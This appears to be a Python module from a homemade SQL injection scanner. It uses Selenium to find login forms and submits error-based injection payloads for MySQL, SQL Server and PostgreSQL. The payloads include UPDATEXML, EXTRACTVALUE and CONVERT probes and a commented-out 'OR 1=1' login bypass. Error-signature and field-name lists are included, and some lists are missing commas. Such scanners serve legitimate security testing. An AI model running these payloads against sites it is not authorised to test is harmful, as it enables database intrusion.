import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import UnexpectedAlertPresentException, TimeoutException, NoAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager

from input import Input_obj

EXPECTED_DELAY = 5
TOLERANCE = 2

ERROR_PAYLOAD_MYSQL = [
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, DATABASE(), 0x7e, FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a) --",
    "' OR 1=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) -- ",
    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",
]

ERROR_PAYLOAD_SQL_SERV = [
    "' AND 1=CONVERT(int,(SELECT @@version)) -- ",
    "' AND 1=(SELECT @@version FOR XML PATH('')) --",
]

ERROR_PAYLOAD_POSTGRESQL = [
    "' AND 1=CAST((SELECT version()) AS int) -- ",
    "' AND 1=(SELECT 1/0) -- ",
]

ERROR_MSG_MYSQL = [
    "You have an error in your SQL syntax;",
    "MySQL server version"
    "Duplicate entry"
]

ERROR_MSG_SQL_SERV = [
    "Microsoft OLE DB Provider for SQL Server",
    "[SQLSTATE",
    "Unclosed quotation mark"
]

ERROR_MSG_POSTGRESQL = [
    "PG::SyntaxError"
    "ERROR: syntax error at or near"
    "PostgreSQL"
]


PASSWORD_ACR = [
    "passw", "password", "pass", "passwd", "pwd", "user_pass", "user_password",
    "passphrase", "secret", "login_pass", "login_password", "account_password"
]

USERNAME_ACR = [
    "uid", "uname", "username", "user", "user_id", "user_name", "login", "loginid",
    "login_id", "userid", "user_name", "userlogin", "user_login", "account", "acct",
    "member", "membername", "member_id", "email", "mail", "email_address"
]


class Page:
    def __init__(self, url):
        self.url = url
        self.inputs = []
        self.usable_inputs = []
        self.database = None
        
        self.find_input()
        
        self.error_based_detection()
        
        
    #! DETECTOR
        
    def identify_input(self, ACR):
        for input in self.usable_inputs:
            if input.name in ACR:
                return input
        return None
        
    def identify_login(self, login):
        if login in USERNAME_ACR:
            return True
        return False
    
    def identify_password(self, password):
        if password in PASSWORD_ACR:
            return True
        return False
        
        
    #! SQL DRIVER
    
    def inject_input(self, driver, username_field_name, first_input, password_field_name=None, second_input=None):
        try:
            driver.get(self.url)
            wait = WebDriverWait(driver, 10)
            first_field = wait.until(EC.presence_of_element_located((By.NAME, username_field_name)))
            if password_field_name is not None and second_input is not None:
                second_field = wait.until(EC.presence_of_element_located((By.NAME, password_field_name)))
                second_field.send_keys(second_input)
                first_field.send_keys(first_input)
            if password_field_name is not None and second_input is not None:
                second_field.send_keys(Keys.RETURN)
            else:
                first_field.send_keys(Keys.RETURN)
        except Exception as e:
            print(f"Error during injection: {e}")
    
    def error_based_detection(self):
        #! STARTING SELENIUM 
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(EXPECTED_DELAY + TOLERANCE + 10)
        
        #! HOP ON URL
        print(f"Navigate to : {self.url}")
        
        if self.identify_input(PASSWORD_ACR) != None and self.identify_input(USERNAME_ACR) != None:
            username_field_name = self.identify_input(USERNAME_ACR).name
            password_field_name = self.identify_input(PASSWORD_ACR).name
            print("DETECTED A LOGIN PAGE ! ")
            
            for error_payload in ERROR_PAYLOAD_MYSQL:
                self.inject_input(driver, username_field_name, error_payload, password_field_name=password_field_name, second_input="password")
                try:  
                    WebDriverWait(driver, 2).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    print(f"Alert Text (after payload): {alert.text}")
                    alert.accept()
                except TimeoutException:
                    # print("No alert present after payload.")
                    # Try to find error messages by common selectors (ID or class)
                    error_elements = driver.find_elements(By.ID, "Error")
                    if not error_elements:
                        error_elements = driver.find_elements(By.CLASS_NAME, "error")
                    if not error_elements:
                        error_elements = driver.find_elements(By.XPATH, "//*[contains(text(), 'error') or contains(text(), 'Error')]")
                    input_elements = [element.get_attribute('outerHTML') for element in error_elements]
                    print(input_elements)
                    
        
        # #! LOOPING INPUT
        # for input in self.usable_inputs:
            
        #     driver.get(self.url)
            
        #     try: #! CHECK PRECENSE OF ELEMENT
        #         wait.until(EC.presence_of_element_located((By.NAME, input.name)))
        #         print(f"{input.name}")
        #     except TimeoutException:
        #         print(f"Timeout: Input field with name '{input.name}' not found on {self.url}")
        #         driver.quit()
        #         return
            
            
                
                
            
            # try: #! ENTER TEXT IN INPUT
            #     if self.identify_login(input.name) == True:
            #         print("THIS A LOGIN")
            #     elif self.identify_password(input.name) == True:
            #         print("THIS IS A PASS")
                
            #     input_field = wait.until(EC.presence_of_element_located((By.NAME, input.name)))
            #     input_field.send_keys("admin' OR 1=1 #")
            #     input_field.send_keys(Keys.RETURN)
                                
            #     try: #? WATCH FOR ALERT
            #         WebDriverWait(driver, 2).until(EC.alert_is_present())
            #         alert = driver.switch_to.alert
            #         print(f"Alert Text (after payload): {alert.text}")
            #         alert.accept()
                
            #     except TimeoutException:
            #         pass
                
            # except Exception as e:
            #     print(f"PAS OK: {e}")
        
        driver.quit()   
        
        
    def identify_database(self):
        pass
        
    
    #! INPUTS
                        
    def return_inputs(self):
        return self.inputs    
    
    def find_input(self):
        options = webdriver.ChromeOptions()
        # options.add_argument("--headless")
        
        service = Service(ChromeDriverManager().install())
        
        driver = webdriver.Chrome(service=service, options=options)
        
        try:
            driver.get(self.url)
            time.sleep(2)
            
            input_elements = [element.get_attribute('outerHTML') for element in driver.find_elements(By.TAG_NAME, "input")]
            if input_elements:
                for input_html in input_elements: 
                    if '"text"' in input_html or '"password"' in input_html:
                        self.inputs.append(Input_obj(input_html, self.url, True))
                        self.usable_inputs.append(Input_obj(input_html, self.url, True))
                    else:
                        self.inputs.append(Input_obj(input_html, self.url))
            else:
                print("No input elements found.")
        except Exception as e:
            print(f"Error finding input elements: {e}")
        finally:
            driver.quit()
            
    #! PRINT
            
    def __str__(self):
        
        len = 0
        for input in self.inputs:
            if input.usable == True:
                len+=1
        
        return f"\033[1;31m[{self.url}]\033[0m : found {len} sqli entry"